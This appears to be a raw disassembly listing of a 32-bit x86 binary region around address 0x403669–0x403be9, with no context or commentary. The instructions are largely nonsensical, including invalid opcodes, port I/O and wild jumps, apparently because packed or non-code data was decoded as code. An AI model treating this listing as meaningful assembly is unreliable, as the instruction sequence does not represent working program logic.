  403669:	80 b0 e0 b1 2b 9d 8f 	xorb   $0x8f,-0x62d44e20(%eax)
  403670:	a1 3f 06 ed d9       	mov    0xd9ed063f,%eax
  403675:	06                   	push   %es
  403676:	af                   	scas   %es:(%edi),%eax
  403677:	0d 0f 4a 9c 77       	or     $0x779c4a0f,%eax
  40367c:	e6 8f                	out    %al,$0x8f
  40367e:	96                   	xchg   %eax,%esi
  40367f:	c4                   	(bad)
  403680:	f2 12 8c cd 96 6f 82 	repnz adc -0x3a7d906a(%ebp,%ecx,8),%cl
  403687:	c5 
  403688:	6a ef                	push   $0xffffffef
  40368a:	58                   	pop    %eax
  40368b:	fd                   	std
  40368c:	71 28                	jno    0x4036b6
  40368e:	6a 95                	push   $0xffffff95
  403690:	c3                   	ret
  403691:	66 fb                	data16 sti
  403693:	50                   	push   %eax
  403694:	ed                   	in     (%dx),%eax
  403695:	33 c7                	xor    %edi,%eax
  403697:	79 ed                	jns    0x403686
  403699:	e8 79 e3 f9 f9       	call   0xfa3a1a17
  40369e:	be 58 ae d8 35       	mov    $0x35d8ae58,%esi
  4036a3:	45                   	inc    %ebp
  4036a4:	6d                   	insl   (%dx),%es:(%edi)
  4036a5:	c3                   	ret
  4036a6:	0c 3b                	or     $0x3b,%al
  4036a8:	d4 a1                	aam    $0xa1
  4036aa:	b2 1a                	mov    $0x1a,%dl
  4036ac:	52                   	push   %edx
  4036ad:	cf                   	iret
  4036ae:	c5 69 cc             	lds    -0x34(%ecx),%ebp
  4036b1:	ec                   	in     (%dx),%al
  4036b2:	fe 04 de             	incb   (%esi,%ebx,8)
  4036b5:	82 3f 91             	cmpb   $0x91,(%edi)
  4036b8:	9f                   	lahf
  4036b9:	64 f7 26             	mull   %fs:(%esi)
  4036bc:	f1                   	int1
  4036bd:	83 39 2d             	cmpl   $0x2d,(%ecx)
  4036c0:	da 9b cc cf 4b 99    	ficompl -0x66b43034(%ebx)
  4036c6:	e0 a5                	loopne 0x40366d
  4036c8:	f2 80 ce f3          	repnz or $0xf3,%dh
  4036cc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4036cd:	45                   	inc    %ebp
  4036ce:	b7 d2                	mov    $0xd2,%bh
  4036d0:	99                   	cltd
  4036d1:	e1 d9                	loope  0x4036ac
  4036d3:	69 28 44 c4 28 d9    	imul   $0xd928c444,(%eax),%ebp
  4036d9:	38 d4                	cmp    %dl,%ah
  4036db:	61                   	popa
  4036dc:	71 96                	jno    0x403674
  4036de:	b8 b4 e8 ec 0c       	mov    $0xcece8b4,%eax
  4036e3:	8a d9                	mov    %cl,%bl
  4036e5:	92                   	xchg   %eax,%edx
  4036e6:	16                   	push   %ss
  4036e7:	8d                   	lea    (bad),%esi
  4036e8:	f5                   	cmc
  4036e9:	c8 f1 66 22          	enter  $0x66f1,$0x22
  4036ed:	2c 71                	sub    $0x71,%al
  4036ef:	96                   	xchg   %eax,%esi
  4036f0:	f3 3c de             	repz cmp $0xde,%al
  4036f3:	2c 35                	sub    $0x35,%al
  4036f5:	08 1e                	or     %bl,(%esi)
  4036f7:	43                   	inc    %ebx
  4036f8:	27                   	daa
  4036f9:	f0 f9                	lock stc
  4036fb:	fd                   	std
  4036fc:	73 63                	jae    0x403761
  4036fe:	f0 ce                	lock into
  403700:	a2 ab 28 a2 cd       	mov    %al,0xcda228ab
  403705:	70 0b                	jo     0x403712
  403707:	8f a9 8d 5a          	(bad)
  40370b:	8a c0                	mov    %al,%al
  40370d:	4b                   	dec    %ebx
  40370e:	87 c4                	xchg   %eax,%esp
  403710:	a9 02 5d 3f 44       	test   $0x443f5d02,%eax
  403715:	d7                   	xlat   %ds:(%ebx)
  403716:	fd                   	std
  403717:	27                   	daa
  403718:	ce                   	into
  403719:	95                   	xchg   %eax,%ebp
  40371a:	e3 32                	jecxz  0x40374e
  40371c:	57                   	push   %edi
  40371d:	0c 54                	or     $0x54,%al
  40371f:	b6 14                	mov    $0x14,%dh
  403721:	b2 85                	mov    $0x85,%dl
  403723:	30 4f 0a             	xor    %cl,0xa(%edi)
  403726:	64 9c                	fs pushf
  403728:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403729:	9e                   	sahf
  40372a:	aa                   	stos   %al,%es:(%edi)
  40372b:	18 b2 67 e3 3d ca    	sbb    %dh,-0x35c21c99(%edx)
  403731:	d3 35 2b 46 6e 87    	shll   %cl,0x876e462b
  403737:	f1                   	int1
  403738:	b6 cd                	mov    $0xcd,%dh
  40373a:	39 98 8b 02 b9 ea    	cmp    %ebx,-0x1546fd75(%eax)
  403740:	b4 b6                	mov    $0xb6,%ah
  403742:	2a d9                	sub    %cl,%bl
  403744:	73 78                	jae    0x4037be
  403746:	12 71 e1             	adc    -0x1f(%ecx),%dh
  403749:	b9 f1 66 cb 15       	mov    $0x15cb66f1,%ecx
  40374e:	11 21                	adc    %esp,(%ecx)
  403750:	5e                   	pop    %esi
  403751:	bc 48 58 7c 91       	mov    $0x917c5848,%esp
  403756:	25 c4 9b cd 2f       	and    $0x2fcd9bc4,%eax
  40375b:	6f                   	outsl  %ds:(%esi),(%dx)
  40375c:	b1 b7                	mov    $0xb7,%cl
  40375e:	86 5b cc             	xchg   %bl,-0x34(%ebx)
  403761:	e7 79                	out    %eax,$0x79
  403763:	0a ff                	or     %bh,%bh
  403765:	32 33                	xor    (%ebx),%dh
  403767:	07                   	pop    %es
  403768:	92                   	xchg   %eax,%edx
  403769:	f2 8d                	repnz lea (bad),%esp
  40376b:	e0 c6                	loopne 0x403733
  40376d:	f3 70 7e             	repz jo 0x4037ee
  403770:	58                   	pop    %eax
  403771:	7d d8                	jge    0x40374b
  403773:	40                   	inc    %eax
  403774:	9f                   	lahf
  403775:	c1 b7 1c a9 64 e3 65 	shll   $0x65,-0x1c9b56e4(%edi)
  40377c:	c3                   	ret
  40377d:	fc                   	cld
  40377e:	39 3c 47             	cmp    %edi,(%edi,%eax,2)
  403781:	54                   	push   %esp
  403782:	c3                   	ret
  403783:	7c d5                	jl     0x40375a
  403785:	28 86 79 e7 f3 24    	sub    %al,0x24f3e779(%esi)
  40378b:	73 67                	jae    0x4037f4
  40378d:	59                   	pop    %ecx
  40378e:	bc 0b d0 e8 4f       	mov    $0x4fe8d00b,%esp
  403793:	e2 69                	loop   0x4037fe
  403795:	86 f8                	xchg   %bh,%al
  403797:	d6                   	salc
  403798:	61                   	popa
  403799:	91                   	xchg   %eax,%ecx
  40379a:	37                   	aaa
  40379b:	8f                   	(bad)
  40379c:	d7                   	xlat   %ds:(%ebx)
  40379d:	e4 cd                	in     $0xcd,%al
  40379f:	87 bd 99 30 c7 1c    	xchg   %edi,0x1cc73099(%ebp)
  4037a5:	f9                   	stc
  4037a6:	66 9c                	pushfw
  4037a8:	c5 bb 10 bd 05 87    	lds    -0x78fa42f0(%ebx),%edi
  4037ae:	de 0c b3             	fimuls (%ebx,%esi,4)
  4037b1:	cc                   	int3
  4037b2:	37                   	aaa
  4037b3:	5b                   	pop    %ebx
  4037b4:	bc b8 0a 85 bd       	mov    $0xbd850ab8,%esp
  4037b9:	61                   	popa
  4037ba:	ce                   	into
  4037bb:	09 e5                	or     %esp,%ebp
  4037bd:	63 cf                	arpl   %ecx,%edi
  4037bf:	68 01 58 0c b6       	push   $0xb60c5801
  4037c4:	2a 30                	sub    (%eax),%dh
  4037c6:	a1 c9 14 98 0b       	mov    0xb9814c9,%eax
  4037cb:	f9                   	stc
  4037cc:	1b 21                	sbb    (%ecx),%esp
  4037ce:	0c c4                	or     $0xc4,%al
  4037d0:	dc 92 37 17 bf 61    	fcoml  0x61bf1737(%edx)
  4037d6:	fb                   	sti
  4037d7:	7c a7                	jl     0x403780
  4037d9:	22 78 42             	and    0x42(%eax),%bh
  4037dc:	66 d5 bd             	data16 aad $0xbd
  4037df:	72 a2                	jb     0x403783
  4037e1:	7b cf                	jnp    0x4037b2
  4037e3:	44                   	inc    %esp
  4037e4:	f7 51 e9             	notl   -0x17(%ecx)
  4037e7:	52                   	push   %edx
  4037e8:	fc                   	cld
  4037e9:	39 3f                	cmp    %edi,(%edi)
  4037eb:	68 ef 75 5e e5       	push   $0xe55e75ef
  4037f0:	9b                   	fwait
  4037f1:	e0 19                	loopne 0x40380c
  4037f3:	af                   	scas   %es:(%edi),%eax
  4037f4:	4f                   	dec    %edi
  4037f5:	6c                   	insb   (%dx),%es:(%edi)
  4037f6:	ef                   	out    %eax,(%dx)
  4037f7:	f5                   	cmc
  4037f8:	89 ed                	mov    %ebp,%ebp
  4037fa:	91                   	xchg   %eax,%ecx
  4037fb:	6b 61 93 da          	imul   $0xffffffda,-0x6d(%ecx),%esp
  4037ff:	33 c0                	xor    %eax,%eax
  403801:	26 a0 75 d2 ea 2f    	mov    %es:0x2fead275,%al
  403807:	e0 fd                	loopne 0x403806
  403809:	5f                   	pop    %edi
  40380a:	c8 c7 c5 5b          	enter  $0xc5c7,$0x5b
  40380e:	c4 53 37             	les    0x37(%ebx),%edx
  403811:	7b 17                	jnp    0x40382a
  403813:	d1 ec                	shr    $1,%esp
  403815:	59                   	pop    %ecx
  403816:	cc                   	int3
  403817:	bb c9 1c 11 17       	mov    $0x17111cc9,%ebx
  40381c:	99                   	cltd
  40381d:	9b                   	fwait
  40381e:	1c 12                	sbb    $0x12,%al
  403820:	ba df 66 b4 c4       	mov    $0xc4b466df,%edx
  403825:	18 7d 19             	sbb    %bh,0x19(%ebp)
  403828:	bc a5 62 de 4b       	mov    $0x4bde62a5,%esp
  40382d:	4b                   	dec    %ebx
  40382e:	10 73 42             	adc    %dh,0x42(%ebx)
  403831:	ed                   	in     (%dx),%eax
  403832:	ad                   	lods   %ds:(%esi),%eax
  403833:	91                   	xchg   %eax,%ecx
  403834:	a1 21 38 08 6f       	mov    0x6f083821,%eax
  403839:	5a                   	pop    %edx
  40383a:	a8 db                	test   $0xdb,%al
  40383c:	e2 d2                	loop   0x403810
  40383e:	66 7a 4b             	data16 jp 0x40388c
  403841:	78 e9                	js     0x40382c
  403843:	52                   	push   %edx
  403844:	79 1d                	jns    0x403863
  403846:	23 6c 16 71          	and    0x71(%esi,%edx,1),%ebp
  40384a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40384b:	9c                   	pushf
  40384c:	8b 63 cf             	mov    -0x31(%ebx),%esp
  40384f:	66 c7                	data16 (bad)
  403851:	65 63 45 f3          	arpl   %eax,%gs:-0xd(%ebp)
  403855:	b5 b3                	mov    $0xb3,%ch
  403857:	ed                   	in     (%dx),%eax
  403858:	d9 cb                	fxch   %st(3)
  40385a:	b0 ce                	mov    $0xce,%al
  40385c:	39 38                	cmp    %edi,(%eax)
  40385e:	16                   	push   %ss
  40385f:	ec                   	in     (%dx),%al
  403860:	da d9                	fcmovu %st(1),%st
  403862:	f1                   	int1
  403863:	d9 38                	fnstcw (%eax)
  403865:	5c                   	pop    %esp
  403866:	61                   	popa
  403867:	d7                   	xlat   %ds:(%ebx)
  403868:	ce                   	into
  403869:	4e                   	dec    %esi
  40386a:	c8 5e 41 c7          	enter  $0x415e,$0xc7
  40386e:	c4                   	(bad)
  40386f:	ec                   	in     (%dx),%al
  403870:	95                   	xchg   %eax,%ebp
  403871:	74 4c                	je     0x4038bf
  403873:	ca 5e c5             	lret   $0xc55e
  403876:	83 5b cd 47          	sbbl   $0x47,-0x33(%ebx)
  40387a:	b1 94                	mov    $0x94,%cl
  40387c:	5b                   	pop    %ebx
  40387d:	0e                   	push   %cs
  40387e:	7e ce                	jle    0x40384e
  403880:	32 3a                	xor    (%edx),%bh
  403882:	27                   	daa
  403883:	39 7b 2e             	cmp    %edi,0x2e(%ebx)
  403886:	6f                   	outsl  %ds:(%esi),(%dx)
  403887:	28 7b 0d             	sub    %bh,0xd(%ebx)
  40388a:	d7                   	xlat   %ds:(%ebx)
  40388b:	e7 f1                	out    %eax,$0xf1
  40388d:	e9 23 67 26 e0       	jmp    0xe0669fb5
  403892:	7c 60                	jl     0x4038f4
  403894:	b4 3e                	mov    $0x3e,%ah
  403896:	5b                   	pop    %ebx
  403897:	f8                   	clc
  403898:	3c f2                	cmp    $0xf2,%al
  40389a:	97                   	xchg   %eax,%edi
  40389b:	51                   	push   %ecx
  40389c:	56                   	push   %esi
  40389d:	d9 e5                	fxam
  40389f:	3c 9f                	cmp    $0x9f,%al
  4038a1:	37                   	aaa
  4038a2:	c3                   	ret
  4038a3:	cc                   	int3
  4038a4:	f3 cd 66             	repz int $0x66
  4038a7:	75 20                	jne    0x4038c9
  4038a9:	2d 39 2c 9a df       	sub    $0xdf9a2c39,%eax
  4038ae:	bb 16 08 8d 56       	mov    $0x568d0816,%ebx
  4038b3:	c7                   	(bad)
  4038b4:	2d 09 fb 05 27       	sub    $0x2705fb09,%eax
  4038b9:	05 5f ab ad fe       	add    $0xfeadab5f,%eax
  4038be:	0a 7e 9a             	or     -0x66(%esi),%bh
  4038c1:	e2 af                	loop   0x403872
  4038c3:	c4 83 59 f1 ae e5    	les    -0x1a510ea7(%ebx),%eax
  4038c9:	97                   	xchg   %eax,%edi
  4038ca:	a9 e2 b6 b7 7a       	test   $0x7ab7b6e2,%eax
  4038cf:	72 43                	jb     0x403914
  4038d1:	7c 3e                	jl     0x403911
  4038d3:	50                   	push   %eax
  4038d4:	5b                   	pop    %ebx
  4038d5:	66 48                	dec    %ax
  4038d7:	ca 50 db             	lret   $0xdb50
  4038da:	92                   	xchg   %eax,%edx
  4038db:	d1 d4                	rcl    $1,%esp
  4038dd:	65 1f                	gs pop %ds
  4038df:	85 87 f9 66 df 5c    	test   %eax,0x5cdf66f9(%edi)
  4038e5:	ec                   	in     (%dx),%al
  4038e6:	bb 1c df 02 ce       	mov    $0xce02df1c,%ebx
  4038eb:	b3 b2                	mov    $0xb2,%bl
  4038ed:	d7                   	xlat   %ds:(%ebx)
  4038ee:	f1                   	int1
  4038ef:	94                   	xchg   %eax,%esp
  4038f0:	6a f8                	push   $0xfffffff8
  4038f2:	aa                   	stos   %al,%es:(%edi)
  4038f3:	93                   	xchg   %eax,%ebx
  4038f4:	8e 8b 87 b7 56 ad    	mov    -0x52a94879(%ebx),%cs
  4038fa:	52                   	push   %edx
  4038fb:	44                   	inc    %esp
  4038fc:	55                   	push   %ebp
  4038fd:	56                   	push   %esi
  4038fe:	73 de                	jae    0x4038de
  403900:	9b                   	fwait
  403901:	5d                   	pop    %ebp
  403902:	c7                   	(bad)
  403903:	af                   	scas   %es:(%edi),%eax
  403904:	58                   	pop    %eax
  403905:	cf                   	iret
  403906:	d1 c0                	rol    $1,%eax
  403908:	bb 74 3d 22 36       	mov    $0x36223d74,%ebx
  40390d:	36 1b c7             	ss sbb %edi,%eax
  403910:	c6                   	(bad)
  403911:	3c 47                	cmp    $0x47,%al
  403913:	53                   	push   %ebx
  403914:	b2 17                	mov    $0x17,%dl
  403916:	73 3f                	jae    0x403957
  403918:	98                   	cwtl
  403919:	7a 5e                	jp     0x403979
  40391b:	76 23                	jbe    0x403940
  40391d:	1e                   	push   %ds
  40391e:	02 39                	add    (%ecx),%bh
  403920:	fa                   	cli
  403921:	75 52                	jne    0x403975
  403923:	e4 85                	in     $0x85,%al
  403925:	3d 0a a1 32 af       	cmp    $0xaf32a10a,%eax
  40392a:	70 7f                	jo     0x4039ab
  40392c:	13 5f 47             	adc    0x47(%edi),%ebx
  40392f:	14 6f                	adc    $0x6f,%al
  403931:	33 3f                	xor    (%edi),%edi
  403933:	50                   	push   %eax
  403934:	46                   	inc    %esi
  403935:	61                   	popa
  403936:	13 e6                	adc    %esi,%esp
  403938:	b8 3d bb 18 93       	mov    $0x9318bb3d,%eax
  40393d:	c9                   	leave
  40393e:	6e                   	outsb  %ds:(%esi),(%dx)
  40393f:	41                   	inc    %ecx
  403940:	c7 40 d3 22 3b 89 ee 	movl   $0xee893b22,-0x2d(%eax)
  403947:	50                   	push   %eax
  403948:	2d cf d8 24 ad       	sub    $0xad24d8cf,%eax
  40394d:	cf                   	iret
  40394e:	70 f4                	jo     0x403944
  403950:	b8 83 f7 ac ee       	mov    $0xeeacf783,%eax
  403955:	84 64 3e e1          	test   %ah,-0x1f(%esi,%edi,1)
  403959:	4a                   	dec    %edx
  40395a:	b0 2a                	mov    $0x2a,%al
  40395c:	0d 80 b8 a2 77       	or     $0x77a2b880,%eax
  403961:	03 bf e7 70 ad 52    	add    0x52ad70e7(%edi),%edi
  403967:	26 5e                	es pop %esi
  403969:	2f                   	das
  40396a:	47                   	inc    %edi
  40396b:	b4 9b                	mov    $0x9b,%ah
  40396d:	0c b6                	or     $0xb6,%al
  40396f:	85 6a bb             	test   %ebp,-0x45(%edx)
  403972:	cb                   	lret
  403973:	e4 62                	in     $0x62,%al
  403975:	31 98 c7 b3 f9 f5    	xor    %ebx,-0xa064c39(%eax)
  40397b:	04 17                	add    $0x17,%al
  40397d:	97                   	xchg   %eax,%edi
  40397e:	8d 5a be             	lea    -0x42(%edx),%ebx
  403981:	7a 98                	jp     0x40391b
  403983:	78 07                	js     0x40398c
  403985:	99                   	cltd
  403986:	95                   	xchg   %eax,%ebp
  403987:	28 63 f6             	sub    %ah,-0xa(%ebx)
  40398a:	7a 7e                	jp     0x403a0a
  40398c:	8c e3                	mov    %fs,%ebx
  40398e:	d7                   	xlat   %ds:(%ebx)
  40398f:	37                   	aaa
  403990:	ff af 75 9b f8 d1    	ljmp   *-0x2e07648b(%edi)
  403996:	ae                   	scas   %es:(%edi),%al
  403997:	d6                   	salc
  403998:	c5 45 2a             	lds    0x2a(%ebp),%eax
  40399b:	57                   	push   %edi
  40399c:	2e 52                	cs push %edx
  40399e:	b9 62 d5 9a 2f       	mov    $0x2f9ad562,%ecx
  4039a3:	85 f9                	test   %edi,%ecx
  4039a5:	42                   	inc    %edx
  4039a6:	58                   	pop    %eax
  4039a7:	20 85 05 42 c8 13    	and    %al,0x13c84205(%ebp)
  4039ad:	c7 85 b2 60 a1 10 f2 	movl   $0x2f90a5f2,0x10a160b2(%ebp)
  4039b4:	a5 90 2f 
  4039b7:	84 02                	test   %al,(%edx)
  4039b9:	29 14 08             	sub    %edx,(%eax,%ecx,1)
  4039bc:	a1 50 0a 85 42       	mov    0x42850a50,%eax
  4039c1:	28 92 42 91 10 16    	sub    %dl,0x16109142(%edx)
  4039c7:	49                   	dec    %ecx
  4039c8:	61                   	popa
  4039c9:	91                   	xchg   %eax,%ecx
  4039ca:	10 16                	adc    %dl,(%esi)
  4039cc:	4b                   	dec    %ebx
  4039cd:	61                   	popa
  4039ce:	b1 10                	mov    $0x10,%cl
  4039d0:	8a a5 50 2c 84 25    	mov    0x25842c50(%ebp),%ah
  4039d6:	52                   	push   %edx
  4039d7:	20 63 95             	and    %ah,-0x6b(%ebx)
  4039da:	c8 3f 2d 77          	enter  $0x2d3f,$0x77
  4039de:	70 39                	jo     0x403a19
  4039e0:	f7 5f 9a             	negl   -0x66(%edi)
  4039e3:	e8 f3 2e 38 96       	call   0x967868db
  4039e8:	ba c2 94 7d 34       	mov    $0x347d94c2,%edx
  4039ed:	3f                   	aas
  4039ee:	1a b2 bb d4 a5 78    	sbb    0x78a5d4bb(%edx),%dh
  4039f4:	ab                   	stos   %eax,%es:(%edi)
  4039f5:	da 4f db             	fimull -0x25(%edi)
  4039f8:	44                   	inc    %esp
  4039f9:	c7                   	(bad)
  4039fa:	94                   	xchg   %eax,%esp
  4039fb:	c8 56 4b c4          	enter  $0x4b56,$0xc4
  4039ff:	65 96                	gs xchg %eax,%esi
  403a01:	4a                   	dec    %edx
  403a02:	61                   	popa
  403a03:	a9 10 96 49 61       	test   $0x61499610,%eax
  403a08:	99                   	cltd
  403a09:	10 96 8b e3 0a 59    	adc    %dl,0x590ae38b(%esi)
  403a0f:	b0 42                	mov    $0x42,%al
  403a11:	08 2b                	or     %ch,(%ebx)
  403a13:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a14:	b0 52                	mov    $0x52,%al
  403a16:	08 ab a4 b0 4a 08    	or     %ch,0x84ab0a4(%ebx)
  403a1c:	ab                   	stos   %eax,%es:(%edi)
  403a1d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403a1e:	b0 5a                	mov    $0x5a,%al
  403a20:	08 a5 52 20 e3 02    	or     %ah,0x2e32052(%ebp)
  403a26:	99                   	cltd
  403a27:	c4 a2 c1 72 9e 84    	les    -0x7b618d3f(%edx),%esp
  403a2d:	21 7b 97             	and    %edi,-0x69(%ebx)
  403a30:	1a b4 57 0d ba 47 04 	sbb    0x447ba0d(%edi,%edx,2),%dh
  403a37:	ed                   	in     (%dx),%eax
  403a38:	90                   	nop
  403a39:	67 39 44 33          	cmp    %eax,0x33(%si)
  403a3d:	6b a4 b0 46 08 65 52 	imul   $0x28,0x52650846(%eax,%esi,4),%esp
  403a44:	28 
  403a45:	13 42 b9             	adc    -0x47(%edx),%eax
  403a48:	38 56 c8             	cmp    %dl,-0x38(%esi)
  403a4b:	82 0a 21             	orb    $0x21,(%edx)
  403a4e:	54                   	push   %esp
  403a4f:	4a                   	dec    %edx
  403a50:	a1 52 08 6b a5       	mov    0xa56b0852,%eax
  403a55:	40                   	inc    %eax
  403a56:	86 36                	xchg   %dh,(%esi)
  403a58:	45                   	inc    %ebp
  403a59:	d7                   	xlat   %ds:(%ebx)
  403a5a:	71 77                	jno    0x403ad3
  403a5c:	93                   	xchg   %eax,%ebx
  403a5d:	8c 70 36             	mov    %?,0x36(%eax)
  403a60:	f9                   	stc
  403a61:	18 e1                	sbb    %ah,%cl
  403a63:	d9 22                	fldenv (%edx)
  403a65:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403a66:	2a 79 5a             	sub    0x5a(%ecx),%bh
  403a69:	95                   	xchg   %eax,%ebp
  403a6a:	68 a7 5a 0a d5       	push   $0xd50a5aa7
  403a6f:	42                   	inc    %edx
  403a70:	38 4a 0a             	cmp    %cl,0xa(%edx)
  403a73:	47                   	inc    %edi
  403a74:	09 61 9d             	or     %esp,-0x63(%ecx)
  403a77:	38 d6                	cmp    %dl,%dh
  403a79:	c8 82 1a 21          	enter  $0x1a82,$0x21
  403a7d:	d4 4a                	aam    $0x4a
  403a7f:	a1 56 08 75 52       	mov    0x52750856,%eax
  403a84:	a8 13                	test   $0x13,%al
  403a86:	42                   	inc    %edx
  403a87:	bd 14 ea 85 d0       	mov    $0xd085ea14,%ebp
  403a8c:	20 85 06 21 ac 97    	and    %al,-0x6853defa(%ebp)
  403a92:	c2 fa 09             	ret    $0x9fa
  403a95:	d3 25 6f b0 85 fb    	shll   %cl,0xfb85b06f
  403a9b:	77 4e                	ja     0x403aeb
  403a9d:	f4                   	hlt
  403a9e:	31 8f ab d4 9e be    	xor    %ecx,-0x41612b55(%edi)
  403aa4:	46                   	inc    %esi
  403aa5:	ed                   	in     (%dx),%eax
  403aa6:	e9 11 71 1b 5d       	jmp    0x5d5babbc
  403aab:	c7                   	(bad)
  403aac:	b3 fb                	mov    $0xfb,%bl
  403aae:	e7 0f                	out    %eax,$0xf
  403ab0:	2a e3                	sub    %bl,%ah
  403ab2:	9c                   	pushf
  403ab3:	ba 88 ca cd d9       	mov    $0xd9cdca88,%edx
  403ab8:	17                   	pop    %ss
  403ab9:	a8 73                	test   $0x73,%al
  403abb:	eb 3f                	jmp    0x403afc
  403abd:	9c                   	pushf
  403abe:	8c a1 34 ca 50 1a    	mov    %fs,0x1a50ca34(%ecx)
  403ac4:	45                   	inc    %ebp
  403ac5:	6c                   	insb   (%dx),%es:(%edi)
  403ac6:	4d                   	dec    %ebp
  403ac7:	52                   	push   %edx
  403ac8:	68 12 42 b3 14       	push   $0x14b34212
  403acd:	9a 85 d0 22 8e 1b 64 	lcall  $0x641b,$0x8e22d085
  403ad4:	c1 06 21             	roll   $0x21,(%esi)
  403ad7:	6c                   	insb   (%dx),%es:(%edi)
  403ad8:	94                   	xchg   %eax,%esp
  403ad9:	c2 46 21             	ret    $0x2146
  403adc:	b4 4a                	mov    $0x4a,%ah
  403ade:	a1 55 08 6d 52       	mov    0x526d0855,%eax
  403ae3:	68 13 c2 26 29       	push   $0x2926c213
  403ae8:	6c                   	insb   (%dx),%es:(%edi)
  403ae9:	12 c2                	adc    %dl,%al
  403aeb:	d1 52 38             	rcll   $1,0x38(%edx)
  403aee:	5a                   	pop    %edx
  403aef:	08 c7                	or     %al,%bh
  403af1:	48                   	dec    %eax
  403af2:	e1 98                	loope  0x403a8c
  403af4:	09 63 5c             	or     %esp,0x5c(%ebx)
  403af7:	34 e8                	xor    $0xe8,%al
  403af9:	54                   	push   %esp
  403afa:	fb                   	sti
  403afb:	e6 5e                	out    %al,$0x5e
  403afd:	9e                   	sahf
  403afe:	c8 05 3f 90          	enter  $0x3f05,$0x90
  403b02:	8d                   	lea    (bad),%ebx
  403b03:	d9 37                	fnstenv (%edi)
  403b05:	ab                   	stos   %eax,%es:(%edi)
  403b06:	e9 de a4 f6 c1       	jmp    0xc236dfe9
  403b0b:	fd                   	std
  403b0c:	22 db                	and    %bl,%bl
  403b0e:	63 65 63             	arpl   %esp,0x63(%ebp)
  403b11:	c7                   	(bad)
  403b12:	8a d6                	mov    %dh,%dl
  403b14:	8f                   	(bad)
  403b15:	93                   	xchg   %eax,%ebx
  403b16:	c2 71 42             	ret    $0x4271
  403b19:	68 97 42 bb 10       	push   $0x10bb4297
  403b1e:	9c                   	pushf
  403b1f:	e2 e8                	loop   0x403b09
  403b21:	92                   	xchg   %eax,%edx
  403b22:	05 2e 21 6c 96       	add    $0x966c212e,%eax
  403b27:	c2 66 21             	ret    $0x2166
  403b2a:	74 48                	je     0x403b74
  403b2c:	a1 43 08 9d 52       	mov    0x529d0843,%eax
  403b31:	e8 14 82 5b 0a       	call   0xa9bbd4a
  403b36:	6e                   	outsb  %ds:(%esi),(%dx)
  403b37:	fd                   	std
  403b38:	f4                   	hlt
  403b39:	b5 0f                	mov    $0xf,%ch
  403b3b:	7a 44                	jp     0x403b81
  403b3d:	79 97                	jns    0x403ad6
  403b3f:	2c ef                	sub    $0xef,%al
  403b41:	12 c2                	adc    %dl,%al
  403b43:	16                   	push   %ss
  403b44:	29 6c 11 c2          	sub    %ebp,-0x3e(%ecx,%edx,1)
  403b48:	56                   	push   %esi
  403b49:	29 6c 15 82          	sub    %ebp,-0x7e(%ebp,%edx,1)
  403b4d:	3c 75                	cmp    $0x75,%al
  403b4f:	9b                   	fwait
  403b50:	2c d8                	sub    $0xd8,%al
  403b52:	26 84 ed             	es test %ch,%ch
  403b55:	52                   	push   %edx
  403b56:	20 63 87             	and    %ah,-0x79(%ebx)
  403b59:	ec                   	in     (%dx),%al
  403b5a:	a0 f4 41 af da       	mov    0xdaaf41f4,%al
  403b5f:	6f                   	outsl  %ds:(%esi),(%dx)
  403b60:	2f                   	das
  403b61:	a9 d3 e2 90 e8       	test   $0xe890e2d3,%eax
  403b66:	99                   	cltd
  403b67:	6e                   	outsb  %ds:(%esi),(%dx)
  403b68:	59                   	pop    %ecx
  403b69:	bd 5b 9c df 23       	mov    $0x23df9c5b,%ebp
  403b6e:	85 1e                	test   %ebx,(%esi)
  403b70:	21 f4                	and    %esi,%esp
  403b72:	4a                   	dec    %edx
  403b73:	a1 57 08 5e 71       	mov    0x715e0857,%eax
  403b78:	ec                   	in     (%dx),%al
  403b79:	93                   	xchg   %eax,%ebx
  403b7a:	05 7d 42 38 5e       	add    $0x5e38427d,%eax
  403b7f:	0a c7                	or     %bh,%al
  403b81:	0b c1                	or     %ecx,%eax
  403b83:	27                   	daa
  403b84:	05 9f 10 fc 52       	add    $0x52fc109f,%eax
  403b89:	f0 eb 3b             	lock jmp 0x403bc7
  403b8c:	22 6e 70             	and    0x70(%esi),%ch
  403b8f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403b90:	28 ef                	sub    %ch,%bh
  403b92:	97                   	xchg   %eax,%edi
  403b93:	e5 fd                	in     $0xfd,%eax
  403b95:	42                   	inc    %edx
  403b96:	18 90 c2 80 10 76    	sbb    %dl,0x761080c2(%eax)
  403b9c:	48                   	dec    %eax
  403b9d:	61                   	popa
  403b9e:	87 10                	xchg   %edx,(%eax)
  403ba0:	e4 a9                	in     $0xa9,%al
  403ba2:	bb 64 c1 2e 21       	mov    $0x212ec164,%ebx
  403ba7:	ec                   	in     (%dx),%al
  403ba8:	96                   	xchg   %eax,%esi
  403ba9:	02 19                	add    (%ecx),%bl
  403bab:	b4 27                	mov    $0x27,%ah
  403bad:	7a 02                	jp     0x403bb1
  403baf:	9f                   	lahf
  403bb0:	6f                   	outsl  %ds:(%esi),(%dx)
  403bb1:	e1 f4                	loope  0x403ba7
  403bb3:	bc a4 eb ce cc       	mov    $0xccceeba4,%esp
  403bb8:	7e 1f                	jle    0x403bd9
  403bba:	7b c1                	jnp    0x403b7d
  403bbc:	bf 91 36 1c f1       	mov    $0xf11c3691,%edi
  403bc1:	83 83 58 2f 86 f1 6d 	addl   $0x6d,-0xe79d0a8(%ebx)
  403bc8:	96                   	xchg   %eax,%esi
  403bc9:	79 8e                	jns    0x403b59
  403bcb:	e2 ab                	loop   0x403b78
  403bcd:	c6                   	(bad)
  403bce:	dd 80 a5 3b 4b dd    	fldl   -0x22b4c45b(%eax)
  403bd4:	44                   	inc    %esp
  403bd5:	ed                   	in     (%dx),%eax
  403bd6:	2b 3d 5a b3 7a cf    	sub    0xcf7ab35a,%edi
  403bdc:	c1 75 8a 65          	shll   $0x65,-0x76(%ebp)
  403be0:	e3 dc                	jecxz  0x403bbe
  403be2:	0e                   	push   %cs
  403be3:	1b 0c f0             	sbb    (%eax,%esi,8),%ecx
  403be6:	4e                   	dec    %esi
  403be7:	cd ce                	int    $0xce
  403be9:	e1 8f                	loope  0x403b7a
